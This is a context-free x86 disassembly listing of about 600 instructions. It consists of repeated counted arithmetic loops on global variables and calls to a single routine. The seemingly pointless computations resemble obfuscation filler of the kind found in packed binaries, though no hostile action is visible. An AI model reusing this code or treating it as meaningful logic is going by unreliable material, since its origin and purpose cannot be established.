  427f93:	cmp    ecx,eax
  427f95:	je     0x427fc1
  427f97:	lea    edi,[eax+ecx*1+0x5]
  427f9b:	cmp    edi,0x39b
  427fa1:	je     0x427fc1
  427fa3:	lea    esi,[edi+eax*1+0x32]
  427fa7:	cmp    esi,ecx
  427fa9:	jne    0x427faf
  427fab:	lea    edi,[eax+ecx*1+0x1f]
  427faf:	movzx  eax,cl
  427fb2:	add    edx,0x5
  427fb5:	cmp    edx,0xc4f
  427fbb:	lea    eax,[eax+edi*1+0x4]
  427fbf:	jl     0x427f93
  427fc1:	mov    edx,0x9b9
  427fc6:	dec    edi
  427fc7:	je     0x427fdc
  427fc9:	sub    edi,0x12
  427fcc:	je     0x427fd7
  427fce:	push   0x5c
  427fd0:	pop    esi
  427fd1:	sub    esi,eax
  427fd3:	mov    eax,esi
  427fd5:	jmp    0x427fea
  427fd7:	lea    eax,[ecx+0x18]
  427fda:	jmp    0x427fea
  427fdc:	movzx  esi,ax
  427fdf:	sub    esi,ecx
  427fe1:	inc    esi
  427fe2:	mov    DWORD PTR ds:0x43e058,esi
  427fe8:	mov    ecx,esi
  427fea:	lea    edi,[eax+ecx*1+0x5]
  427fee:	cmp    ecx,edi
  427ff0:	jne    0x428008
  427ff2:	mov    esi,eax
  427ff4:	imul   esi,esi,0x5c
  427ff7:	cmp    ecx,esi
  427ff9:	je     0x428004
  427ffb:	mov    edi,ecx
  427ffd:	sub    edi,eax
  427fff:	add    edi,0x2e
  428002:	jmp    0x428008
  428004:	lea    edi,[eax+ecx*1+0x4]
  428008:	lea    esi,[edi+eax*1+0x32]
  42800c:	cmp    esi,ecx
  42800e:	jne    0x428014
  428010:	lea    edi,[eax+ecx*1+0x1f]
  428014:	dec    edx
  428015:	jne    0x427fc6
  428017:	mov    eax,ebx
  428019:	sub    eax,ebp
  42801b:	add    eax,0x2e
  42801e:	mov    edx,eax
  428020:	dec    edx
  428021:	mov    ds:0x43e05c,eax
  428026:	jne    0x428039
  428028:	movzx  eax,bp
  42802b:	sub    eax,ebx
  42802d:	inc    eax
  42802e:	mov    ebx,eax
  428030:	lea    eax,[ebx+ebp*1+0x1f]
  428034:	mov    ds:0x43e05c,eax
  428039:	and    DWORD PTR ds:0x43e09c,0x0
  428040:	movzx  edx,al
  428043:	movzx  esi,bl
  428046:	mov    ebp,edi
  428048:	dec    ebp
  428049:	lea    edx,[edx+edi*1-0xe]
  42804d:	lea    esi,[esi+eax*1+0x4]
  428051:	jne    0x428065
  428053:	movzx  edi,dx
  428056:	sub    edi,ecx
  428058:	inc    edi
  428059:	mov    ecx,edi
  42805b:	mov    DWORD PTR ds:0x43e058,ecx
  428061:	lea    edi,[edx+ecx*1+0x1f]
  428065:	mov    DWORD PTR [esp+0x10],0x9b9
  42806d:	mov    edx,eax
  42806f:	dec    edx
  428070:	je     0x4280a9
  428072:	sub    edx,0x12
  428075:	je     0x42809d
  428077:	xor    edx,edx
  428079:	add    eax,0x2e
  42807c:	xor    ebp,ebp
  42807e:	sub    eax,DWORD PTR ds:0x43e05c
  428084:	sbb    edx,ebp
  428086:	sub    eax,esi
  428088:	sbb    edx,DWORD PTR ds:0x43e09c
  42808e:	add    eax,0x2e
  428091:	adc    edx,ebp
  428093:	mov    esi,eax
  428095:	mov    DWORD PTR ds:0x43e09c,edx
  42809b:	jmp    0x4280b1
  42809d:	and    DWORD PTR ds:0x43e09c,0x0
  4280a4:	lea    esi,[ebx+0x18]
  4280a7:	jmp    0x4280b1
  4280a9:	movzx  eax,si
  4280ac:	sub    eax,ebx
  4280ae:	inc    eax
  4280af:	mov    ebx,eax
  4280b1:	lea    eax,[esi+ebx*1+0x5]
  4280b5:	cmp    ebx,eax
  4280b7:	mov    ds:0x43e05c,eax
  4280bc:	jne    0x4280f0
  4280be:	push   0x0
  4280c0:	push   0x5c
  4280c2:	push   DWORD PTR ds:0x43e09c
  4280c8:	push   esi
  4280c9:	call   0x437b80
  4280ce:	xor    ecx,ecx
  4280d0:	cmp    ebx,eax
  4280d2:	jne    0x4280d8
  4280d4:	cmp    ecx,edx
  4280d6:	je     0x4280e1
  4280d8:	mov    eax,ebx
  4280da:	sub    eax,esi
  4280dc:	add    eax,0x2e
  4280df:	jmp    0x4280e5
  4280e1:	lea    eax,[esi+ebx*1+0x4]
  4280e5:	mov    ecx,DWORD PTR ds:0x43e058
  4280eb:	mov    ds:0x43e05c,eax
  4280f0:	xor    edx,edx
  4280f2:	mov    DWORD PTR [esp+0x18],eax
  4280f6:	add    DWORD PTR [esp+0x18],esi
  4280fa:	mov    ebp,DWORD PTR [esp+0x18]
  4280fe:	adc    edx,DWORD PTR ds:0x43e09c
  428104:	add    ebp,0x32
  428107:	adc    edx,0x0
  42810a:	cmp    ebp,ebx
  42810c:	mov    DWORD PTR [esp+0x20],ebp
  428110:	jne    0x428121
  428112:	xor    ebp,ebp
  428114:	cmp    edx,ebp
  428116:	jne    0x428121
  428118:	lea    eax,[esi+ebx*1+0x1f]
  42811c:	mov    ds:0x43e05c,eax
  428121:	dec    DWORD PTR [esp+0x10]
  428125:	jne    0x42806d
  42812b:	movzx  eax,al
  42812e:	lea    eax,[eax+edi*1-0xe]
  428132:	mov    ds:0x43e07c,eax
  428137:	lea    eax,[esi+ebx*1+0x1f]
  42813b:	lea    edx,[eax+ebx*1-0x32]
  42813f:	cmp    edx,0x23e
  428145:	jb     0x428155
  428147:	mov    esi,ebx
  428149:	sub    esi,eax
  42814b:	add    esi,0x2e
  42814e:	and    DWORD PTR ds:0x43e09c,0x0
  428155:	mov    DWORD PTR [esp+0x10],0x9b9
  42815d:	mov    edx,eax
  42815f:	dec    edx
  428160:	je     0x428195
  428162:	sub    edx,0x12
  428165:	je     0x428189
  428167:	xor    edi,edi
  428169:	xor    ebp,ebp
  42816b:	lea    edx,[eax+0x2e]
  42816e:	sub    edx,eax
  428170:	sbb    edi,ebp
  428172:	sub    edx,esi
  428174:	sbb    edi,DWORD PTR ds:0x43e09c
  42817a:	add    edx,0x2e
  42817d:	adc    edi,ebp
  42817f:	mov    esi,edx
  428181:	mov    DWORD PTR ds:0x43e09c,edi
  428187:	jmp    0x42819d
  428189:	and    DWORD PTR ds:0x43e09c,0x0
  428190:	lea    esi,[ebx+0x18]
  428193:	jmp    0x42819d
  428195:	movzx  eax,si
  428198:	sub    eax,ebx
  42819a:	inc    eax
  42819b:	mov    ebx,eax
  42819d:	lea    eax,[esi+ebx*1+0x5]
  4281a1:	cmp    ebx,eax
  4281a3:	jne    0x4281d2
  4281a5:	push   0x0
  4281a7:	push   0x5c
  4281a9:	push   DWORD PTR ds:0x43e09c
  4281af:	push   esi
  4281b0:	call   0x437b80
  4281b5:	xor    ecx,ecx
  4281b7:	cmp    ebx,eax
  4281b9:	jne    0x4281bf
  4281bb:	cmp    ecx,edx
  4281bd:	je     0x4281c8
  4281bf:	mov    eax,ebx
  4281c1:	sub    eax,esi
  4281c3:	add    eax,0x2e
  4281c6:	jmp    0x4281cc
  4281c8:	lea    eax,[esi+ebx*1+0x4]
  4281cc:	mov    ecx,DWORD PTR ds:0x43e058
  4281d2:	xor    edi,edi
  4281d4:	mov    edx,eax
  4281d6:	add    edx,esi
  4281d8:	adc    edi,DWORD PTR ds:0x43e09c
  4281de:	add    edx,0x32
  4281e1:	adc    edi,0x0
  4281e4:	xor    ebp,ebp
  4281e6:	cmp    edx,ebx
  4281e8:	jne    0x4281f2
  4281ea:	cmp    edi,ebp
  4281ec:	jne    0x4281f2
  4281ee:	lea    eax,[esi+ebx*1+0x1f]
  4281f2:	dec    DWORD PTR [esp+0x10]
  4281f6:	jne    0x42815d
  4281fc:	mov    edi,eax
  4281fe:	sub    edi,DWORD PTR ds:0x43e07c
  428204:	xor    edx,edx
  428206:	add    edi,0x2e
  428209:	lea    ebp,[ebx-0x3222]
  42820f:	sub    ebp,esi
  428211:	sbb    edx,DWORD PTR ds:0x43e09c
  428217:	mov    DWORD PTR [esp+0x10],0x3c
  42821f:	mov    DWORD PTR ds:0x43e09c,edx
  428225:	mov    edx,DWORD PTR ds:0x43e07c
  42822b:	cmp    ecx,edx
  42822d:	je     0x428263
  42822f:	lea    edi,[edx+ecx*1+0x5]
  428233:	cmp    edi,0x39b
  428239:	je     0x428263
  42823b:	lea    esi,[edi+edx*1+0x32]
  42823f:	cmp    esi,ecx
  428241:	jne    0x428247
  428243:	lea    edi,[edx+ecx*1+0x1f]
  428247:	add    DWORD PTR [esp+0x10],0x5
  42824c:	cmp    DWORD PTR [esp+0x10],0xc4f
  428254:	movzx  edx,cl
  428257:	lea    edx,[edx+edi*1+0x4]
  42825b:	mov    DWORD PTR ds:0x43e07c,edx
  428261:	jl     0x42822b
  428263:	mov    DWORD PTR [esp+0x10],0x9b9
  42826b:	mov    edx,eax
  42826d:	dec    edx
  42826e:	je     0x4282a9
  428270:	sub    edx,0x12
  428273:	je     0x42829d
  428275:	xor    edx,edx
  428277:	xor    esi,esi
  428279:	lea    ecx,[eax+0x2e]
  42827c:	sub    ecx,eax
  42827e:	sbb    edx,esi
  428280:	sub    ecx,ebp
  428282:	sbb    edx,DWORD PTR ds:0x43e09c
  428288:	add    ecx,0x2e
  42828b:	adc    edx,esi
  42828d:	mov    ebp,ecx
  42828f:	mov    ecx,DWORD PTR ds:0x43e058
  428295:	mov    DWORD PTR ds:0x43e09c,edx
  42829b:	jmp    0x4282b1
  42829d:	and    DWORD PTR ds:0x43e09c,0x0
  4282a4:	lea    ebp,[ebx+0x18]
  4282a7:	jmp    0x4282b1
  4282a9:	movzx  eax,bp
  4282ac:	sub    eax,ebx
  4282ae:	inc    eax
  4282af:	mov    ebx,eax
  4282b1:	lea    eax,[ebx+ebp*1+0x5]
  4282b5:	cmp    ebx,eax
  4282b7:	jne    0x4282e6
  4282b9:	push   0x0
  4282bb:	push   0x5c
  4282bd:	push   DWORD PTR ds:0x43e09c
  4282c3:	push   ebp
  4282c4:	call   0x437b80
  4282c9:	xor    ecx,ecx
  4282cb:	cmp    ebx,eax
  4282cd:	jne    0x4282d3
  4282cf:	cmp    ecx,edx
  4282d1:	je     0x4282dc
  4282d3:	mov    eax,ebx
  4282d5:	sub    eax,ebp
  4282d7:	add    eax,0x2e
  4282da:	jmp    0x4282e0
  4282dc:	lea    eax,[ebx+ebp*1+0x4]
  4282e0:	mov    ecx,DWORD PTR ds:0x43e058
  4282e6:	xor    edx,edx
  4282e8:	mov    esi,eax
  4282ea:	add    esi,ebp
  4282ec:	adc    edx,DWORD PTR ds:0x43e09c
  4282f2:	add    esi,0x32
  4282f5:	adc    edx,0x0
  4282f8:	cmp    esi,ebx
  4282fa:	mov    DWORD PTR [esp+0x20],esi
  4282fe:	jne    0x42830a
  428300:	xor    esi,esi
  428302:	cmp    edx,esi
  428304:	jne    0x42830a
  428306:	lea    eax,[ebx+ebp*1+0x1f]
  42830a:	dec    DWORD PTR [esp+0x10]
  42830e:	jne    0x42826b
  428314:	sub    eax,DWORD PTR ds:0x43e07c
  42831a:	sub    eax,0x3222
  42831f:	mov    esi,eax
  428321:	mov    eax,0x9b9
  428326:	dec    edi
  428327:	je     0x42833c
  428329:	sub    edi,0x12
  42832c:	je     0x428337
  42832e:	push   0x5c
  428330:	pop    edx
  428331:	sub    edx,esi
  428333:	mov    esi,edx
  428335:	jmp    0x42834a
  428337:	lea    esi,[ecx+0x18]
  42833a:	jmp    0x42834a
  42833c:	movzx  edx,si
  42833f:	sub    edx,ecx
  428341:	inc    edx
  428342:	mov    DWORD PTR ds:0x43e058,edx
  428348:	mov    ecx,edx
  42834a:	lea    edi,[esi+ecx*1+0x5]
  42834e:	cmp    ecx,edi
  428350:	jne    0x428368
  428352:	mov    edx,esi
  428354:	imul   edx,edx,0x5c
  428357:	cmp    ecx,edx
  428359:	je     0x428364
  42835b:	mov    edi,ecx
  42835d:	sub    edi,esi
  42835f:	add    edi,0x2e
  428362:	jmp    0x428368
  428364:	lea    edi,[esi+ecx*1+0x4]
  428368:	lea    edx,[edi+esi*1+0x32]
  42836c:	cmp    edx,ecx
  42836e:	jne    0x428374
  428370:	lea    edi,[esi+ecx*1+0x1f]
  428374:	dec    eax
  428375:	jne    0x428326
  428377:	push   0x0
  428379:	push   0x5c
  42837b:	push   DWORD PTR ds:0x43e09c
  428381:	push   ebp
  428382:	call   0x437b80
  428387:	cmp    ebx,eax
  428389:	jne    0x428391
  42838b:	xor    eax,eax
  42838d:	cmp    eax,edx
  42838f:	je     0x42839a
  428391:	mov    eax,ebx
  428393:	sub    eax,ebp
  428395:	add    eax,0x2e
  428398:	jmp    0x42839e
  42839a:	lea    eax,[ebx+ebp*1+0x4]
  42839e:	movzx  ecx,bl
  4283a1:	mov    ebp,eax
  4283a3:	sub    ebp,esi
  4283a5:	lea    esi,[ecx+eax*1+0x4]
  4283a9:	mov    ecx,edi
  4283ab:	sub    ebp,0x3222
  4283b1:	xor    eax,eax
  4283b3:	dec    ecx
  4283b4:	je     0x4283cf
  4283b6:	sub    ecx,0x12
  4283b9:	je     0x4283c4
  4283bb:	push   0x5c
  4283bd:	pop    ecx
  4283be:	sub    ecx,ebp
  4283c0:	mov    ebp,ecx
  4283c2:	jmp    0x4283e3
  4283c4:	mov    ebp,DWORD PTR ds:0x43e058
  4283ca:	add    ebp,0x18
  4283cd:	jmp    0x4283e3
  4283cf:	movzx  ecx,bp
  4283d2:	sub    ecx,DWORD PTR ds:0x43e058
  4283d8:	inc    ecx
  4283d9:	mov    DWORD PTR ds:0x43e058,ecx
  4283df:	lea    edi,[ecx+ebp*1+0x1f]
  4283e3:	push   eax
  4283e4:	push   0x5c
  4283e6:	push   eax
  4283e7:	push   esi
  4283e8:	call   0x437b80
  4283ed:	cmp    ebx,eax
  4283ef:	jne    0x4283f7
  4283f1:	xor    eax,eax
  4283f3:	cmp    eax,edx
  4283f5:	je     0x428400
  4283f7:	mov    eax,ebx
  4283f9:	sub    eax,esi
  4283fb:	add    eax,0x2e
  4283fe:	jmp    0x428404
  428400:	lea    eax,[esi+ebx*1+0x4]
  428404:	movzx  ecx,ax
  428407:	mov    eax,ebx
  428409:	sub    eax,esi
  42840b:	add    eax,0x2e
  42840e:	sub    ecx,ebp
  428410:	lea    edx,[eax+ebx*1-0x32]
  428414:	add    ecx,edi
  428416:	cmp    edx,0x23e
  42841c:	jb     0x428425
  42841e:	mov    esi,ebx
  428420:	sub    esi,eax
  428422:	add    esi,0x2e
  428425:	lea    edi,[ecx+eax*1+0x5]
  428429:	mov    eax,ebx
  42842b:	sub    eax,esi
  42842d:	mov    ebp,eax
  42842f:	sub    ebp,ecx
  428431:	lea    ecx,[eax+0x2e]
  428434:	xor    edx,edx
  428436:	sub    ebp,0x31f4
  42843c:	mov    eax,ecx
  42843e:	add    eax,esi
  428440:	mov    DWORD PTR ds:0x43e09c,edx
  428446:	adc    edx,edx
  428448:	add    eax,0x32
  42844b:	adc    edx,0x0
  42844e:	cmp    eax,ebx
  428450:	jne    0x42845c
  428452:	xor    eax,eax
  428454:	cmp    edx,eax
  428456:	jne    0x42845c
  428458:	lea    ecx,[esi+ebx*1+0x1f]
  42845c:	add    edi,ebp
  42845e:	lea    eax,[edi+ecx*1+0x3ef9]
  428465:	dec    eax
  428466:	je     0x428481
  428468:	sub    eax,0x12
  42846b:	je     0x428476
  42846d:	push   0x5c
  42846f:	pop    eax
  428470:	sub    eax,ebp
  428472:	mov    ebp,eax
  428474:	jmp    0x428490
  428476:	mov    ebp,DWORD PTR ds:0x43e058
  42847c:	add    ebp,0x18
  42847f:	jmp    0x428490
  428481:	movzx  eax,bp
  428484:	sub    eax,DWORD PTR ds:0x43e058
  42848a:	inc    eax
  42848b:	mov    ds:0x43e058,eax
  428490:	mov    edi,DWORD PTR ds:0x43e09c
  428496:	xor    edx,edx
  428498:	lea    ecx,[esi+ebx*1+0x5]
  42849c:	mov    eax,ecx
  42849e:	add    eax,esi
  4284a0:	adc    edx,edi
  4284a2:	add    eax,0x32
  4284a5:	adc    edx,0x0
  4284a8:	cmp    eax,ebx
  4284aa:	jne    0x4284b6
  4284ac:	xor    eax,eax
  4284ae:	cmp    edx,eax
  4284b0:	jne    0x4284b6
  4284b2:	lea    ecx,[esi+ebx*1+0x1f]
  4284b6:	mov    eax,ecx
  4284b8:	sub    eax,ebp
  4284ba:	add    eax,0x2e
  4284bd:	mov    ds:0x43e094,eax
  4284c2:	movzx  eax,bx
  4284c5:	cdq    
  4284c6:	sub    eax,esi
  4284c8:	sbb    edx,edi
  4284ca:	push   0x0
  4284cc:	add    eax,ecx
  4284ce:	pop    edi
  4284cf:	adc    edx,edi
  4284d1:	mov    esi,ecx
  4284d3:	dec    esi
  4284d4:	mov    DWORD PTR ds:0x43e09c,edx
  4284da:	je     0x428504
  4284dc:	sub    esi,0x12
  4284df:	je     0x4284fd
  4284e1:	xor    esi,esi
  4284e3:	lea    edx,[ecx+0x2e]
  4284e6:	sub    edx,ecx
  4284e8:	sbb    esi,edi
  4284ea:	sub    edx,eax
  4284ec:	sbb    esi,DWORD PTR ds:0x43e09c
  4284f2:	add    edx,0x2e
  4284f5:	adc    esi,edi
  4284f7:	mov    eax,edx
  4284f9:	mov    edx,esi
  4284fb:	jmp    0x428510
  4284fd:	lea    eax,[ebx+0x18]
  428500:	xor    edx,edx
  428502:	jmp    0x428510
  428504:	movzx  ecx,ax
  428507:	sub    ecx,ebx
  428509:	inc    ecx
  42850a:	mov    ebx,ecx
  42850c:	lea    ecx,[eax+ebx*1+0x1f]
  428510:	movzx  edi,cx
  428513:	sub    edi,ebp
  428515:	add    edi,DWORD PTR ds:0x43e094
  42851b:	xor    ebp,ebp
  42851d:	lea    esi,[ebx-0x3222]
  428523:	sub    esi,eax
  428525:	mov    eax,ds:0x43e094
  42852a:	sbb    ebp,edx
  42852c:	xor    edx,edx
  42852e:	push   0x48
  428530:	mov    DWORD PTR ds:0x43e09c,ebp
  428536:	pop    ebp
  428537:	div    ebp
  428539:	mov    edx,DWORD PTR ds:0x43e058
  42853f:	cmp    eax,0x65
  428542:	jbe    0x428559
  428544:	mov    ebp,DWORD PTR ds:0x43e094
  42854a:	lea    eax,[edi+edx*1]
  42854d:	lea    eax,[eax+ebp*1+0x3ef9]
  428554:	mov    ds:0x43e094,eax
  428559:	mov    eax,ecx
  42855b:	dec    eax
  42855c:	je     0x428597
  42855e:	sub    eax,0x12
  428561:	je     0x42858b
  428563:	xor    edx,edx
  428565:	xor    ebp,ebp
  428567:	lea    eax,[ecx+0x2e]
  42856a:	sub    eax,ecx
  42856c:	sbb    edx,ebp
  42856e:	sub    eax,esi
  428570:	sbb    edx,DWORD PTR ds:0x43e09c
  428576:	add    eax,0x2e
  428579:	adc    edx,ebp
  42857b:	mov    DWORD PTR ds:0x43e09c,edx
  428581:	mov    edx,DWORD PTR ds:0x43e058
  428587:	mov    esi,eax
  428589:	jmp    0x4285a3
  42858b:	and    DWORD PTR ds:0x43e09c,0x0
  428592:	lea    esi,[ebx+0x18]
  428595:	jmp    0x4285a3
  428597:	movzx  eax,si
  42859a:	sub    eax,ebx
  42859c:	inc    eax
  42859d:	mov    ebx,eax
  42859f:	lea    ecx,[esi+ebx*1+0x1f]
  4285a3:	lea    eax,[edi+ecx*1]
  4285a6:	mov    ecx,DWORD PTR ds:0x43e094
  4285ac:	lea    eax,[ecx+eax*1+0x3ef9]
  4285b3:	mov    ecx,0x9b9
  4285b8:	dec    eax
  4285b9:	je     0x4285ce
  4285bb:	sub    eax,0x12
  4285be:	je     0x4285c9
  4285c0:	push   0x5c
  4285c2:	pop    eax
  4285c3:	sub    eax,edi
  4285c5:	mov    edi,eax
  4285c7:	jmp    0x4285db
  4285c9:	lea    edi,[edx+0x18]
  4285cc:	jmp    0x4285db
  4285ce:	movzx  eax,di
  4285d1:	sub    eax,edx
  4285d3:	inc    eax
  4285d4:	mov    ds:0x43e058,eax
  4285d9:	mov    edx,eax
  4285db:	lea    eax,[edi+edx*1+0x5]
  4285df:	cmp    edx,eax
  4285e1:	jne    0x4285f9
  4285e3:	mov    eax,edi
  4285e5:	imul   eax,eax,0x5c
  4285e8:	cmp    edx,eax
  4285ea:	je     0x4285f5
  4285ec:	mov    eax,edx
  4285ee:	sub    eax,edi
  4285f0:	add    eax,0x2e
  4285f3:	jmp    0x4285f9
  4285f5:	lea    eax,[edi+edx*1+0x4]
  4285f9:	lea    ebp,[eax+edi*1+0x32]
  4285fd:	cmp    ebp,edx
  4285ff:	jne    0x428605
  428601:	lea    eax,[edi+edx*1+0x1f]
  428605:	dec    ecx
  428606:	jne    0x4285b8
  428608:	xor    ebp,ebp
  42860a:	push   ebp
  42860b:	push   0x5c
  42860d:	push   DWORD PTR ds:0x43e09c
  428613:	push   esi
  428614:	call   0x437b80
  428619:	cmp    ebx,eax
  42861b:	jne    0x428621
  42861d:	cmp    ebp,edx
  42861f:	je     0x42862a
  428621:	mov    eax,ebx
  428623:	sub    eax,esi
  428625:	add    eax,0x2e
  428628:	jmp    0x42862e
  42862a:	lea    eax,[esi+ebx*1+0x4]
  42862e:	sub    eax,edi
  428630:	sub    eax,0x3222
  428635:	push   0x3c
  428637:	mov    ds:0x43e07c,eax
  42863c:	lea    eax,[esi+ebx*1+0x4]
  428640:	pop    edi
  428641:	cmp    ebx,esi
  428643:	jne    0x42864f
  428645:	xor    ecx,ecx
  428647:	cmp    ecx,DWORD PTR ds:0x43e09c
  42864d:	je     0x428693
  42864f:	lea    eax,[esi+ebx*1+0x5]
  428653:	cmp    eax,0x39b
  428658:	je     0x428693
  42865a:	xor    edx,edx
  42865c:	mov    ecx,eax
  42865e:	add    ecx,esi
  428660:	adc    edx,DWORD PTR ds:0x43e09c
  428666:	add    ecx,0x32
  428669:	adc    edx,0x0
  42866c:	cmp    ecx,ebx
  42866e:	jne    0x42867a
  428670:	xor    ecx,ecx
  428672:	cmp    edx,ecx
  428674:	jne    0x42867a
  428676:	lea    eax,[esi+ebx*1+0x1f]
  42867a:	and    DWORD PTR ds:0x43e09c,0x0
  428681:	movzx  ecx,bl
  428684:	add    edi,0x5
  428687:	cmp    edi,0xc4f
  42868d:	lea    esi,[ecx+eax*1+0x4]
  428691:	jl     0x428641
  428693:	mov    ecx,DWORD PTR ds:0x43e07c
  428699:	push   0x0
  42869b:	push   0x5c
  42869d:	push   DWORD PTR ds:0x43e09c
  4286a3:	lea    ebp,[ecx+eax*1+0x1f]
  4286a7:	push   esi
  4286a8:	call   0x437b80
  4286ad:	cmp    ebx,eax
  4286af:	mov    DWORD PTR [esp+0x18],eax
  4286b3:	mov    DWORD PTR [esp+0x1c],edx
  4286b7:	jne    0x4286bf
  4286b9:	xor    eax,eax
  4286bb:	cmp    eax,edx
  4286bd:	je     0x4286c8
  4286bf:	mov    ecx,ebx
  4286c1:	sub    ecx,esi
  4286c3:	add    ecx,0x2e
  4286c6:	jmp    0x4286cc
  4286c8:	lea    ecx,[esi+ebx*1+0x4]
  4286cc:	movzx  edi,cx
  4286cf:	sub    edi,DWORD PTR ds:0x43e07c
  4286d5:	mov    DWORD PTR [esp+0x10],0x9b9
  4286dd:	add    edi,ebp
  4286df:	dec    ebp
  4286e0:	je     0x4286fb
  4286e2:	sub    ebp,0x12
  4286e5:	mov    ecx,DWORD PTR ds:0x43e058
  4286eb:	je     0x4286f6
  4286ed:	push   0x5c
  4286ef:	pop    eax
  4286f0:	sub    eax,edi
  4286f2:	mov    edi,eax
  4286f4:	jmp    0x42870c
  4286f6:	lea    edi,[ecx+0x18]
  4286f9:	jmp    0x42870c
  4286fb:	movzx  eax,di
  4286fe:	sub    eax,DWORD PTR ds:0x43e058
  428704:	inc    eax
  428705:	mov    ds:0x43e058,eax
  42870a:	mov    ecx,eax
  42870c:	lea    edx,[edi+ecx*1]
  42870f:	lea    ebp,[edx+0x5]
  428712:	cmp    ecx,ebp
  428714:	jne    0x42872b
  428716:	mov    eax,edi
  428718:	imul   eax,eax,0x5c
  42871b:	cmp    ecx,eax
  42871d:	je     0x428728
  42871f:	mov    ebp,ecx
  428721:	sub    ebp,edi
  428723:	add    ebp,0x2e
  428726:	jmp    0x42872b
  428728:	lea    ebp,[edx+0x4]
  42872b:	lea    eax,[edi+ebp*1+0x32]
  42872f:	cmp    eax,ecx
  428731:	jne    0x428736
  428733:	lea    ebp,[edx+0x1f]
  428736:	dec    DWORD PTR [esp+0x10]
  42873a:	jne    0x4286df
  42873c:	cmp    ebx,DWORD PTR [esp+0x18]
  428740:	jne    0x42874a
  428742:	xor    eax,eax
  428744:	cmp    eax,DWORD PTR [esp+0x1c]
  428748:	je     0x428753
  42874a:	mov    eax,ebx
  42874c:	sub    eax,esi
  42874e:	add    eax,0x2e
  428751:	jmp    0x428757
  428753:	lea    eax,[esi+ebx*1+0x4]
  428757:	lea    eax,[edi+eax*1+0x4]
  42875b:	mov    DWORD PTR [esp+0x10],0x9b9
  428763:	dec    eax
  428764:	je     0x42877f
  428766:	sub    eax,0x12
  428769:	mov    ecx,DWORD PTR ds:0x43e058
  42876f:	je     0x42877a
  428771:	push   0x5c
  428773:	pop    eax
  428774:	sub    eax,edi
  428776:	mov    edi,eax
  428778:	jmp    0x428790
  42877a:	lea    edi,[ecx+0x18]
  42877d:	jmp    0x428790
  42877f:	movzx  eax,di
  428782:	sub    eax,DWORD PTR ds:0x43e058
  428788:	inc    eax
  428789:	mov    ds:0x43e058,eax
  42878e:	mov    ecx,eax
  428790:	lea    edx,[edi+ecx*1]
  428793:	lea    eax,[edx+0x5]
  428796:	cmp    ecx,eax
  428798:	jne    0x4287af
  42879a:	mov    eax,edi
  42879c:	imul   eax,eax,0x5c
  42879f:	cmp    ecx,eax
  4287a1:	je     0x4287ac
  4287a3:	mov    eax,ecx
  4287a5:	sub    eax,edi
  4287a7:	add    eax,0x2e
  4287aa:	jmp    0x4287af
  4287ac:	lea    eax,[edx+0x4]
  4287af:	lea    ebp,[eax+edi*1+0x32]
  4287b3:	cmp    ebp,ecx
  4287b5:	jne    0x4287ba
  4287b7:	lea    eax,[edx+0x1f]
  4287ba:	dec    DWORD PTR [esp+0x10]
  4287be:	jne    0x428763
  4287c0:	mov    ecx,DWORD PTR ds:0x43e09c
  4287c6:	mov    DWORD PTR [esp+0x10],0x3c
  4287ce:	cmp    ebx,esi
  4287d0:	jne    0x4287d8
  4287d2:	xor    eax,eax
  4287d4:	cmp    eax,ecx
  4287d6:	je     0x428817
  4287d8:	lea    eax,[esi+ebx*1+0x5]
  4287dc:	cmp    eax,0x39b
  4287e1:	je     0x428817
  4287e3:	xor    ebp,ebp
  4287e5:	mov    edx,eax
  4287e7:	add    edx,esi
  4287e9:	adc    ebp,ecx
  4287eb:	add    edx,0x32
  4287ee:	adc    ebp,0x0
  4287f1:	cmp    edx,ebx
  4287f3:	jne    0x4287ff
  4287f5:	xor    ecx,ecx
  4287f7:	cmp    ebp,ecx
  4287f9:	jne    0x4287ff
  4287fb:	lea    eax,[esi+ebx*1+0x1f]
  4287ff:	add    DWORD PTR [esp+0x10],0x5
  428804:	movzx  ecx,bl
  428807:	lea    esi,[ecx+eax*1+0x4]
  42880b:	xor    ecx,ecx
  42880d:	cmp    DWORD PTR [esp+0x10],0xc4f
  428815:	jl     0x4287ce
  428817:	lea    eax,[esi+ebx*1+0x4]
  42881b:	mov    DWORD PTR [esp+0x10],0x3c
  428823:	cmp    ebx,esi
  428825:	jne    0x42882d
  428827:	xor    edx,edx
  428829:	cmp    edx,ecx
  42882b:	je     0x42886c
  42882d:	lea    eax,[esi+ebx*1+0x5]
  428831:	cmp    eax,0x39b
  428836:	je     0x42886c
  428838:	xor    ebp,ebp
  42883a:	mov    edx,eax
  42883c:	add    edx,esi
  42883e:	adc    ebp,ecx
  428840:	add    edx,0x32
  428843:	adc    ebp,0x0
  428846:	cmp    edx,ebx
  428848:	jne    0x428854
  42884a:	xor    ecx,ecx
  42884c:	cmp    ebp,ecx
  42884e:	jne    0x428854
  428850:	lea    eax,[esi+ebx*1+0x1f]
  428854:	add    DWORD PTR [esp+0x10],0x5
  428859:	movzx  ecx,bl
  42885c:	lea    esi,[ecx+eax*1+0x4]
  428860:	xor    ecx,ecx
  428862:	cmp    DWORD PTR [esp+0x10],0xc4f
  42886a:	jl     0x428823
  42886c:	lea    ebp,[edi+eax*1+0x1f]
  428870:	mov    DWORD PTR [esp+0x10],0x3c
  428878:	mov    ecx,DWORD PTR ds:0x43e058
  42887e:	cmp    ecx,edi
  428880:	je     0x4288b0
  428882:	lea    ebp,[edi+ecx*1+0x5]
  428886:	cmp    ebp,0x39b
  42888c:	je     0x4288b0
  42888e:	lea    edx,[edi+ebp*1+0x32]
  428892:	cmp    edx,ecx
  428894:	jne    0x42889a
  428896:	lea    ebp,[edi+ecx*1+0x1f]
  42889a:	add    DWORD PTR [esp+0x10],0x5
  42889f:	cmp    DWORD PTR [esp+0x10],0xc4f
  4288a7:	movzx  edx,cl
  4288aa:	lea    edi,[edx+ebp*1+0x4]
  4288ae:	jl     0x428878
  4288b0:	movzx  edx,al
  4288b3:	lea    edx,[edx+ebp*1-0xe]
  4288b7:	mov    DWORD PTR ds:0x43e07c,edx
  4288bd:	lea    edx,[esi+ebx*1]
  4288c0:	lea    eax,[eax+edx*1+0x3ef9]
  4288c7:	push   0x48
  4288c9:	xor    edx,edx
  4288cb:	pop    edi
  4288cc:	mov    ds:0x43e05c,eax
  4288d1:	div    edi
  4288d3:	cmp    eax,0x65
  4288d6:	jbe    0x4288e8
  4288d8:	mov    eax,ds:0x43e05c
  4288dd:	add    esi,ebx
  4288df:	lea    edx,[eax+esi*1+0x3ef9]
  4288e6:	jmp    0x4288ee
  4288e8:	mov    edx,DWORD PTR ds:0x43e05c
  4288ee:	mov    eax,ds:0x43e07c
